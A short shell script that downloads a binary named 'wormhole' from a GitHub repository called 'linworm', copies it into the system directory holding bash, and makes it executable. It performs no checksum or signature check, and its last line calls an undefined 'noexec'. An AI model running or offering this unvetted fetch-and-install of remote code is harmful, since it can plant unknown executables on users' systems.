curl  "https://github.com/virtualxcompany/linworm/raw/refs/heads/main/output/wormhole" -o wormhole
file="wormhole"
dir_name=$(dirname "$(which bash)")
if [ -f "$file" ]; then
  
  cp "$file" "$dir_name/$file"
  chmod +x "$dir_name/$file"
  echo "wormhole Installed Successfully"
  rm "wormhole"
  echo ""
  echo "Start using now"
  noexec
fi